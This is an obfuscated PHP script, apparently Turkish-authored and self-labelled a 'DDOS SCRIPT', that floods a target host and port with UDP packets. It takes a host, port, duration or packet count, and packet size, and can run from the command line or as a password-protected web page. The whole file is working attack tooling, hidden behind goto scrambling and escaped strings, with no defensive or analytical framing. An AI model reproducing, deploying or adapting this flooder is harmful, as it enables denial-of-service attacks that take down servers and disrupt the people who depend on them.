<!--
yarram覺 k覺rars覺n覺z
-->
<?php
 goto cJ362; X7b8g: define("\104\104\x4f\x53\137\115\x41\x58\137\105\130\x45\x43\125\x54\111\x4f\x4e\x5f\x54\111\115\x45", 0); goto u6_cF; p9dqO: define("\104\104\117\x53\x5f\117\x55\x54\120\x55\x54\x5f\x53\124\101\124\125\x53\x5f\x45\122\122\x4f\122", "\145\x72\162\157\x72"); goto tFCiF; u6_cF: define("\x44\x44\117\123\x5f\x44\105\x46\x41\125\x4c\x54\137\120\x41\x43\x4b\x45\124\x5f\x53\111\x5a\x45", 65000); goto N9XNQ; MKbZW: define("\x44\104\x4f\123\x5f\114\x4f\x47\x5f\x44\105\102\125\x47", 4); goto LFh6t; WzIif: define("\104\104\117\x53\137\120\x41\123\123\127\117\x52\104", "\x38\x63\70\144\63\65\x37\142\65\x65\x38\67\x32\142\142\x61\x63\x64\x34\65\61\71\x37\x36\62\x36\142\x64\x35\x37\x35\71"); goto X7b8g; dqemR: define("\x44\x44\117\123\137\x4f\x55\124\x50\125\x54\137\x46\117\x52\x4d\x41\x54\x5f\124\105\130\124", "\x74\145\x78\x74"); goto AItUf; AItUf: define("\104\x44\117\123\137\117\125\124\120\x55\x54\137\x46\117\x52\x4d\x41\x54\137\130\x4d\x4c", "\x78\x6d\x6c"); goto p9dqO; cJ362: define("\x44\x44\x4f\x53\x5f\x56\x45\x52\123\x49\x4f\116", "\x30\x2e\62"); goto WzIif; NNTMJ: if (DDoS::is_cli()) { global $argv; parse_str(implode("\x26", array_slice($argv, 1)), $params); } elseif (!empty($_POST)) { foreach ($_POST as $index => $value) { $params[$index] = htmlspecialchars($value, ENT_QUOTES, "\125\124\x46\55\x38"); } } elseif (!empty($_GET["\150\x6f\x73\x74"])) { foreach ($_GET as $index => $value) { $params[$index] = htmlspecialchars($value, ENT_QUOTES, "\x55\x54\106\55\70"); } } goto Hq5di; N9XNQ: define("\x44\x44\x4f\x53\137\x4d\x41\130\x5f\x50\101\103\x4b\105\124\137\123\111\x5a\x45", 65000); goto bG6sR; bG6sR: define("\104\104\117\123\x5f\104\x45\106\101\x55\114\124\137\102\131\x54\x45", "\x0"); goto MKbZW; nWKyC: define("\104\x44\x4f\x53\x5f\x4c\x4f\x47\x5f\116\117\124\x49\x43\105", 2); goto VTjVp; Dqtn5: define("\104\104\x4f\x53\137\x4c\x4f\107\137\105\122\122\117\122", 0); goto Ww_vZ; tFCiF: define("\104\104\117\123\x5f\x4f\x55\124\120\125\124\137\123\x54\x41\124\125\123\x5f\123\x55\x43\103\105\123\x53", "\163\x75\x63\143\x65\x73\x73"); goto LzBIO; Ww_vZ: define("\104\x44\117\x53\x5f\x4f\x55\x54\x50\125\x54\137\x46\117\122\x4d\101\124\137\x4a\123\x4f\x4e", "\x6a\x73\157\x6e"); goto dqemR; LFh6t: define("\x44\104\x4f\x53\x5f\114\x4f\x47\137\x49\x4e\x46\x4f", 3); goto nWKyC; LzBIO: class DDoS { private $params = array("\x68\x6f\x73\x74" => '', "\x70\x6f\162\x74" => '', "\160\141\x63\153\x65\164" => '', "\164\151\155\145" => '', "\x70\141\163\163" => '', "\x62\x79\x74\145\x73" => '', "\166\x65\162\x62\157\163\145" => DDOS_LOG_INFO, "\x66\157\162\x6d\x61\164" => "\x74\145\170\164", "\x6f\x75\164\160\165\x74" => '', "\151\156\164\145\x72\x76\x61\154" => "\x31"); private $log_labels = array(DDOS_LOG_DEBUG => "\x64\x65\x62\165\147", DDOS_LOG_INFO => "\151\156\146\157", DDOS_LOG_NOTICE => "\x6e\x6f\164\x69\143\x65", DDOS_LOG_WARNING => "\167\141\x72\x6e\151\156\147", DDOS_LOG_ERROR => "\145\162\162\x6f\x72"); private $content_type = ''; private $output = array(); public function __construct($params = array()) { ob_start(); ini_set("\155\141\170\137\145\x78\x65\x63\165\x74\151\157\x6e\x5f\x74\151\x6d\145", DDOS_MAX_EXECUTION_TIME); $this->set_params($params); $this->set_content_type(); $this->signature(); if (isset($this->params["\x68\145\x6c\160"])) { $this->usage(); die; } $this->validate_params(); $this->attack(); $this->print_output(); ob_end_flush(); } public function signature() { if (DDOS_OUTPUT_FORMAT_TEXT == $this->get_param("\146\157\162\155\141\164")) { $this->println("\101\104\101\x47\125\122\123\117\131\40\x7c\x20\104\104\x4f\x53\x20\123\x43\x52\111\x50\x54"); $this->println("\x76\145\162\163\x69\171\x6f\x6e\40" . DDOS_VERSION); $this->println(); } } public function usage() { $this->println("\x4f\x52\116\105\x4b\114\x45\122\x3a"); $this->println("\x74\x65\x72\x6d\x69\x6e\141\154\x3a\x20\40\x70\150\160\40\56\x2f" . basename(__FILE__) . "\x20\x68\x6f\x73\164\75\124\101\122\107\x45\x54\x20\160\x6f\x72\x74\75\120\x4f\122\x54\40\x74\x69\155\x65\75\x53\x45\x43\117\x4e\x44\x53\40\x70\x61\143\153\x65\x74\75\116\125\x4d\102\x45\x52\40\142\x79\x74\145\163\75\x4e\125\x4d\102\x45\x52"); $this->println("\x77\x65\x62\x73\145\x72\166\x65\162\72\x20\x68\164\x74\x70\x3a\57\57\x6c\x6f\143\141\154\150\x6f\163\x74\x2f\151\x6e\144\x65\x78\56\x70\150\160\x3f\x70\141\163\x73\75\141\x70\x70\154\145\x26\150\x6f\163\164\75\x54\101\x52\107\105\124\x26\160\157\162\164\75\120\117\x52\x54\x26\x74\151\155\x65\75\123\105\x43\x4f\116\104\123\x26\160\x61\x63\x6b\145\x74\75\116\x55\115\102\x45\x52\x26\x62\171\164\x65\163\x3d\116\125\115\x42\105\x52"); $this->println(); $this->println("\120\101\122\101\x4d\x45\124\x45\x52\123\72"); $this->println("\150\x65\x6c\x70\x9\102\x75\x20\x79\141\162\144\xc4\261\x6d\40\xc3\266\x7a\145\164\151\x20\163\141\x79\x66\x61\163\x69\156\x69\40\171\141\172\x64\x69\162\151\156"); $this->println("\150\157\x73\x74\x9\132\117\122\x55\x4e\114\x55\x20\111\120\40\x76\x65\x79\x61\x20\x48\117\x53\124\116\x41\115\x45\x20\x62\145\154\x69\162\x74\151\x6e"); $this->println("\160\x61\x73\163\x9\x5a\117\x52\125\116\x4c\x55\x20\171\141\x6c\x6e\x69\172\143\141\40\x77\145\142\x20\163\165\x6e\165\x63\x75\163\x75\156\144\x61\x6e\x20\153\x75\154\x6c\141\x6e\x69\x6c\x6d\x69\x79\157\162\x73\x61"); $this->println("\x70\157\162\x74\11\x49\123\124\105\107\105\x20\x42\101\x47\x4c\111\x20\x62\145\x6c\151\162\164\x69\154\x6d\x65\x6d\x69\x73\163\145\x20\x72\x61\163\x74\147\x65\x6c\x65\x20\142\x69\x72\40\160\x6f\x72\164\40\x73\145\x63\x69\x6c\145\143\145\x6b\x74\x69\x72"); $this->println("\x74\x69\155\x65\x9\x49\x53\x54\x45\x47\105\40\x42\x41\x47\114\111\x20\104\104\x6f\123\47\165\x20\x63\141\x6e\x6c\151\40\164\165\164\x6d\141\x6b\40\x69\x63\x69\156\x20\163\x61\156\x69\x79\145\x2c\x20\160\141\x6b\145\164\40\153\x75\154\x6c\141\156\x69\x6c\155\151\x79\x6f\x72\163\141\x20\x67\x65\162\x65\153\154\x69\x64\x69\x72"); $this->println("\x70\141\x63\153\x65\x74\11\111\x53\x54\x45\x47\x45\40\x42\x41\107\114\x49\40\150\145\144\145\x66\145\40\147\303\xb6\x6e\x64\x65\x72\151\154\x65\143\x65\153\x20\x70\x61\153\x65\x74\40\163\x61\x79\x69\163\151\54\40\x7a\141\155\x61\x6e\40\153\x75\x6c\154\141\156\151\154\155\x69\171\x6f\162\x73\141\40\147\145\162\x65\x6b\154\x69\x64\x69\162"); $this->println("\142\171\164\145\x73\11\111\123\x54\105\x47\x45\40\102\101\x47\114\111\x20\x67\303\xb6\x6e\x64\x65\x72\151\x6c\145\x63\x65\x6b\40\x70\x61\153\x65\x74\x69\156\40\x62\157\171\165\164\165\x2c\x20\x76\141\162\x73\141\171\151\154\141\156\x3a\x20" . DDOS_DEFAULT_PACKET_SIZE); $this->println("\146\157\x72\x6d\x61\x74\x9\111\123\124\x45\x47\x45\x20\102\101\x47\114\111\x20\143\x69\x6b\164\151\x20\142\x69\143\151\x6d\x69\x2c\x20\x28\155\145\x74\151\x6e\54\152\163\x6f\156\x2c\x78\155\154\x29\x2c\40\166\x61\x72\x73\141\171\151\154\141\156\x3a\40\155\145\x74\x69\156"); $this->println("\157\x75\x74\x70\x75\164\11\111\123\124\105\x47\x45\40\x42\101\107\114\111\x20\x6c\157\x67\146\151\x6c\x65\54\x20\143\x69\x6b\164\151\x79\x69\40\x64\157\x73\171\x61\171\x61\x20\x6b\x61\171\x64\x65\x64\x69\156"); $this->println("\x76\x65\x72\142\x6f\x73\145\x9\x49\x53\x54\105\107\x45\40\x42\x41\107\114\111\x20\60\x3a\40\x68\x61\164\x61\40\x61\171\xc4\xb0\x6b\x6c\141\x6d\141\54\40\61\x3a\142\151\x6c\x67\151\54\x20\62\72\165\x79\x61\x72\304\260\54\40\x33\72\x75\x79\x61\162\xc4\xb0\54\x20\64\x3a\150\141\x74\141\54\x20\166\x61\162\163\141\x79\304\260\154\141\x6e\72\40\142\151\154\x67\151"); $this->println(); $this->println("\116\157\x74\x65\x3a\x20\x9\110\x65\155\x20\x7a\141\x6d\141\x6e\x20\150\x65\155\40\144\145\x20\160\141\153\x65\164\40\x62\145\x6c\151\x72\164\151\154\x69\162\x73\145\x2c\40\171\141\154\156\151\x7a\143\x61\x20\172\x61\155\141\156\x20\153\x75\x6c\x6c\x61\x6e\x69\154\141\143\x61\153\x74\151\x72\56"); $this->println(); $this->println("\x62\165\x20\x73\143\162\x69\160\x74\x20\141\144\141\40\147\x75\162\163\x6f\x79\x20\x74\141\x72\141\x66\151\156\x64\141\156\x20\x68\141\x7a\151\162\154\141\x6e\x6d\x69\163\x74\x69\x72\x2c\x20\x62\x61\163\153\x61\40\153\151\x6d\163\x65\40\144\x65\147\x69\154\40\x3a\x29"); $this->println(); } private function attack() { $packets = 0; $message = str_repeat(DDOS_DEFAULT_BYTE, $this->get_param("\x62\x79\164\145\163")); $this->log("\125\x44\120\40\123\141\x6c\144\151\162\151\163\x69\40\x42\x61\x73\154\141\x74\151\x6c\x64\x69"); if ($this->get_param("\164\151\x6d\x65")) { $exec_time = $this->get_param("\x74\x69\155\145"); $max_time = time() + $exec_time; while (time() < $max_time) { $packets++; $this->log("\x50\x61\153\x65\x74\x20\107\x6f\156\x64\x65\x72\x69\x6c\x69\171\x6f\x72\40\43" . $packets, DDOS_LOG_DEBUG); $this->udp_connect($this->get_param("\150\x6f\163\x74"), $this->get_param("\x70\x6f\x72\164"), $message); usleep($this->get_param("\x69\156\164\145\x72\166\141\x6c") * 100); } $timeStr = $exec_time . "\x20\x73\145\143\157\x6e\x64"; if (1 != $exec_time) { $timeStr .= "\x73"; } } else { $max_packet = $this->get_param("\160\x61\143\153\x65\164"); $start_time = time(); while ($packets < $max_packet) { $packets++; $this->log("\x50\141\153\x65\164\x20\x67\157\x6e\144\145\x72\x69\154\x64\151\72\x20\x23" . $packets, DDOS_LOG_DEBUG); $this->udp_connect($this->get_param("\x68\x6f\163\x74"), $this->get_param("\160\x6f\x72\164"), $message); usleep($this->get_param("\x69\x6e\x74\145\x72\x76\x61\x6c") * 100); } $exec_time = time() - $start_time; if ($exec_time <= 1) { $exec_time = 1; $timeStr = "\x61\142\157\165\164\x20\x61\40\163\145\143\x6f\156\144"; } else { $timeStr = "\141\142\157\x75\x74\x20" . $exec_time . "\40\x73\145\143\157\156\x64\x73"; } } $this->log("\x55\x44\x50\40\123\x61\x6c\144\x69\162\151\x73\x69\x20\123\157\x6e\154\141\x6e\144\151"); $data = $this->params; unset($data["\160\141\163\x73"]); unset($data["\160\141\143\x6b\145\164"]); unset($data["\x74\151\x6d\145"]); $data["\160\157\162\x74"] = 0 == $data["\x70\x6f\162\164"] ? "\x52\141\163\164\147\145\x6c\x65\x20\x50\x6f\x72\x74" : $data["\160\157\x72\x74"]; $data["\x74\x6f\164\141\x6c\x5f\x70\141\143\x6b\145\x74\163"] = $packets; $data["\164\x6f\x74\x61\154\x5f\x73\151\172\x65"] = $this->format_bytes($packets * $data["\x62\171\164\x65\x73"]); $data["\x64\x75\x72\x61\164\151\157\x6e"] = $timeStr; $data["\141\166\x65\162\141\x67\x65"] = round($packets / $exec_time, 2); $this->set_output("\x55\104\x50\40\x73\141\x6c\144\x69\x72\x69\x73\151\40\x6f\x6e\x61\x79\x6c\141\x6e\x64\x69", DDOS_OUTPUT_STATUS_SUCCESS, $data); $this->print_output(); die; } private function udp_connect($h, $p, $out) { if (0 == $p) { $p = rand(1, rand(1, 65535)); } $this->log("\123\157\153\145\164\151\40\141\x63\x6d\x61\171\141\40\x63\141\x6c\151\x73\151\171\x6f\x72\165\x6d\40\165\x64\160\72\x2f\x2f{$h}\x3a{$p}", DDOS_LOG_DEBUG); $fp = @fsockopen("\165\144\160\x3a\x2f\57" . $h, $p, $errno, $errstr, 30); if (!$fp) { $this->log("\125\x44\x50\40\163\157\x6b\145\164\x20\150\x61\164\x61\x73\151\x3a\x20{$errstr}\40\50{$errno}\51", DDOS_LOG_DEBUG); $ret = false; } else { $this->log("\x53\157\x63\153\145\164\40\157\x70\145\x6e\145\x64\x20\x77\151\x74\x68\x20{$h}\x20\157\156\x20\160\x6f\x72\164\x20{$p}", DDOS_LOG_DEBUG); if (!@fwrite($fp, $out)) { $this->log("\x45\x72\x72\157\x72\x20\x64\x75\x72\151\156\147\40\x73\x65\156\144\151\x6e\147\x20\x64\x61\164\x61", DDOS_LOG_ERROR); } else { $this->log("\104\x61\164\141\40\163\x65\x6e\x74\x20\x73\x75\143\x63\x65\163\163\x66\x75\154\x6c\171", DDOS_LOG_DEBUG); } @fclose($fp); $ret = true; $this->log("\x43\x6c\x6f\x73\x69\156\x67\40\x73\x6f\x63\153\x65\x74\x20\x75\144\160\x3a\x2f\57{$h}\72{$p}", DDOS_LOG_DEBUG); } return $ret; } private function set_params($params = array()) { $original_params = array_keys($this->params); $original_params[] = "\x68\145\x6c\x70"; foreach ($params as $key => $value) { if (!in_array($key, $original_params)) { $this->set_output("\125\156\x6b\x6e\x6f\167\x6e\40\x70\141\x72\141\155\x20{$key}", DDOS_OUTPUT_STATUS_ERROR); $this->print_output(); die(1); } $this->set_param($key, $value); } } private function validate_params() { if (!$this->is_cli() && md5($this->get_param("\x70\141\163\x73")) !== DDOS_PASSWORD) { $this->set_output("\x59\141\x6e\x6c\x69\x73\x20\123\x69\x66\162\145", DDOS_OUTPUT_STATUS_ERROR); $this->print_output(); die(1); } elseif (!$this->is_cli()) { $this->log("\123\151\146\x72\x65\x20\x6f\156\141\x79\x6c\141\x6e\144\151"); } if (!$this->is_valid_target($this->get_param("\150\x6f\x73\x74"))) { $this->set_output("\x59\x61\x6e\x6c\x69\163\x20\x48\157\x73\164", DDOS_OUTPUT_STATUS_ERROR); $this->print_output(); die(1); } else { $this->log("\x48\x6f\x73\x74\x20\141\x79\x61\162\x6c\x61\156\x64\x69\40" . $this->get_param("\x68\157\x73\164")); } if ('' != $this->get_param("\x70\x6f\162\x74") && !$this->is_valid_port($this->get_param("\160\x6f\x72\164"))) { $this->log("\x59\141\156\x6c\x69\163\40\120\x6f\162\164", DDOS_LOG_WARNING); $this->log("\122\141\156\x64\157\155\40\120\x6f\162\164", DDOS_LOG_NOTICE); $this->set_param("\x70\157\x72\x74", 0); } else { $this->log("\120\x6f\162\x74\40\x61\171\141\162\154\x61\156\144\x69\72\40" . $this->get_param("\x70\157\x72\x74")); } if (is_numeric($this->get_param("\x62\x79\164\145\163")) && 0 < $this->get_param("\x62\171\164\x65\x73")) { if (DDOS_MAX_PACKET_SIZE < $this->get_param("\x62\171\164\x65\x73")) { $this->log("\x50\x61\153\x65\x74\x20\x62\157\x79\165\x74\x75\x20\155\141\153\x73\x69\155\165\155\x20\142\157\x79\165\x74\x75\40\x61\163\x69\x79\x6f\162", DDOS_LOG_WARNING); } $this->set_param("\142\x79\164\x65\163", min($this->get_param("\x62\171\x74\145\x73"), DDOS_MAX_PACKET_SIZE)); $this->log("\120\x61\153\145\164\x20\x62\x6f\171\x75\x74\165\x6e\x75\156\x20\141\x79\x61\162\154\141\156\144\151\40" . $this->format_bytes($this->get_param("\x62\171\x74\x65\x73"))); } else { $this->log("\120\141\153\x65\164\40\x62\x6f\171\x75\x74\165\156\165\156\40\141\171\141\x72\154\141\156\144\x69\40" . $this->format_bytes(DDOS_DEFAULT_PACKET_SIZE), DDOS_LOG_NOTICE); $this->set_param("\142\171\x74\145\x73", DDOS_DEFAULT_PACKET_SIZE); } if (!is_numeric($this->get_param("\x74\x69\155\145")) && !is_numeric($this->get_param("\160\x61\143\x6b\145\x74"))) { $this->set_output("\105\x6b\x73\x69\153\40\160\141\x72\x61\155\145\164\x72\x65\x20\x7a\141\x6d\141\x6e\151\x20\166\145\171\141\x20\160\x61\x6b\145\x74\151", DDOS_OUTPUT_STATUS_ERROR); $this->print_output(); die(1); } else { $this->set_param("\164\151\155\145", abs(intval($this->get_param("\164\151\x6d\x65")))); $this->set_param("\x70\x61\143\153\x65\x74", abs(intval($this->get_param("\x70\x61\143\153\145\164")))); } if ('' != $this->get_param("\157\165\164\x70\x75\x74")) { $this->log("\x4c\157\x67\40\144\x6f\163\x79\141\x73\x69\x20" . $this->get_param("\157\x75\164\x70\x75\x74"), DDOS_LOG_INFO); } } public function get_param($param) { return isset($this->params[$param]) ? $this->params[$param] : null; } private function set_param($param, $value) { $this->params[$param] = $value; } private function set_content_type() { if ($this->is_cli()) { return; } switch ($this->get_param("\157\165\164\x70\x75\164")) { case DDOS_OUTPUT_FORMAT_JSON: $this->content_type = "\141\160\x70\x6c\x69\x63\141\164\151\157\156\57\152\x73\x6f\x6e\73\40\x63\150\141\x72\163\x65\164\75\165\164\x66\55\x38\x3b"; break; case DDOS_OUTPUT_FORMAT_XML: $this->content_type = "\x61\160\x70\x6c\x69\x63\x61\x74\x69\157\x6e\57\170\155\154\x3b\40\x63\x68\x61\162\x73\x65\164\x3d\165\164\146\55\x38\x3b"; break; default: $this->content_type = "\164\145\x78\x74\57\x70\x6c\x61\x69\x6e\x3b\x20\x63\x68\x61\x72\x73\x65\164\75\x75\164\146\55\70\x3b"; break; } header("\x43\x6f\156\164\145\156\164\55\124\171\160\x65\72\40" . $this->content_type); $this->log("\123\x65\164\x74\x69\x6e\147\x20\x43\157\156\x74\x65\x6e\x74\x2d\124\171\160\145\x20\150\145\141\x64\x65\162\x20\164\157\40" . $this->content_type, DDOS_LOG_DEBUG); } public static function is_cli() { return php_sapi_name() == "\x63\154\151"; } public function get_random_port() { return rand(1, 65535); } function is_valid_port($port = 0) { return $port >= 1 && $port <= 65535 ? $port : 0; } function is_valid_target($target) { return preg_match("\x2f\x5e\50\x5b\141\x2d\x7a\x5c\144\135\50\x2d\52\133\x61\x2d\172\134\x64\x5d\x29\52\x29\50\134\x2e\50\x5b\x61\55\172\x5c\x64\135\50\55\x2a\133\x61\55\x7a\x5c\144\135\x29\x2a\51\51\52\x24\57\151", $target) && preg_match("\x2f\136\x2e\173\x31\x2c\x32\x35\x33\x7d\44\57", $target) && preg_match("\x2f\x5e\133\x5e\x5c\x2e\x5d\173\61\x2c\66\x33\175\x28\134\56\x5b\x5e\x5c\56\x5d\173\x31\x2c\66\x33\x7d\51\52\44\57", $target) || filter_var($target, FILTER_VALIDATE_IP); } function format_bytes($bytes, $dec = 2) { $size = array("\x42", "\x4b\x42", "\x4d\x42", "\107\x42", "\124\x42", "\x50\x42", "\105\102", "\132\x42", "\x59\102"); $factor = floor((strlen($bytes) - 1) / 3); return sprintf("\45\x2e{$dec}\x66", $bytes / pow(1024, $factor)) . @$size[$factor]; } private function set_output($message, $code, $data = null) { $this->output = array("\x73\x74\x61\164\x75\163" => $code, "\155\145\163\163\x61\x67\x65" => $message); if (null != $data) { $this->output["\x64\141\x74\x61"] = $data; } } private function print_output() { switch ($this->get_param("\x66\x6f\x72\x6d\141\x74")) { case DDOS_OUTPUT_FORMAT_JSON: echo json_encode($this->output); break; case DDOS_OUTPUT_FORMAT_XML: $xml = new SimpleXMLElement("\x3c\x72\157\x6f\164\x2f\76"); array_walk_recursive($this->output, function ($value, $key) use($xml) { $xml->addChild($key, $value); }); print $xml->asXML(); break; default: $this->println(); array_walk_recursive($this->output, function ($value, $key) { $this->println($key . "\72\x20" . $value); }); } } private function log($message, $code = DDOS_LOG_INFO) { if ($code <= $this->get_param("\x76\145\x72\x62\x6f\163\145") && $this->get_param("\146\x6f\162\155\x61\164") == DDOS_OUTPUT_FORMAT_TEXT) { $this->println("\x5b" . $this->log_labels[$code] . "\x5d\x20" . $message); } } private function log_to_file($message) { if ('' != $this->get_param("\157\165\x74\160\165\164")) { file_put_contents($this->get_param("\x6f\165\164\160\165\164"), $message, FILE_APPEND | LOCK_EX); } } private function println($message = '') { echo $message . "\12"; $this->log_to_file($message . "\xa"); ob_flush(); flush(); } } goto LglZ4; LglZ4: $params = array(); goto NNTMJ; VTjVp: define("\104\x44\x4f\x53\x5f\114\117\x47\137\x57\101\x52\x4e\x49\116\x47", 1); goto Dqtn5; Hq5di: $ddos = new DDoS($params);